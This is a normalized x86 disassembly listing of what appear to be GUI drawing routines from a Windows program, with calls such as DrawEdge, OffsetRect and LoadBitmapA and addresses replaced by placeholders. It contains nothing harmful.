lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x22 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424334
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44a134
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423ec8
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_431928
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
movzx edx [ r-xdata ]
call sub_423998
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42455c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4241c0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_42360c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403f64
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42455c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_431928
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx ebx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4324c9
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_430984
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_431928
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_4324e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_432e42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x22 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
call sub_42f0b8
call sub_42f1c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
call sub_42f0b8
call sub_42f1c0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423ec8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_423ec8
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_405270
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_42360c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_423ec8
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_449e44
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42455c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423ec0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_423ec8
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423ec8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423ec0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42a790
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423e9c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x22 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42426c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42830c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_432974
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_4294f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_42360c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_449e44
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_423ec8
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_431928
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
movzx edx [ r-xdata ]
call sub_423998
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42455c
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424334
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44a134
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42455c
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4241c0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_42360c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403f64
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
